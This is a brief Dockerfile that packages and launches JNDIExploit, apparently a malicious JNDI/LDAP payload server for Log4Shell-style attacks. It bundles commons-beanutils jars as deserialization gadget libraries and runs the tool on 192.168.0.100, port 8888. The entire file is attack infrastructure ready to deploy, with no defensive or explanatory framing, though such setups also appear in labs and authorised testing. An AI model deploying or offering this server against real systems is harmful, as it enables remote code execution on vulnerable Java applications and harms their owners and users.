FROM openjdk:8u181-jdk-alpine
EXPOSE 8888
RUN mkdir /app
COPY /lib/commons-beanutils-1.8.2.jar /app/lib/commons-beanutils-1.8.2.jar
COPY /lib/commons-beanutils-1.9.2.jar /app/lib/commons-beanutils-1.9.2.jar
COPY JNDIExploit-1.2-SNAPSHOT.jar /app/JNDIExploit-1.2-SNAPSHOT.jar

CMD ["java", "-jar", "/app/JNDIExploit-1.2-SNAPSHOT.jar", "-i", "192.168.0.100", "-p", "8888"]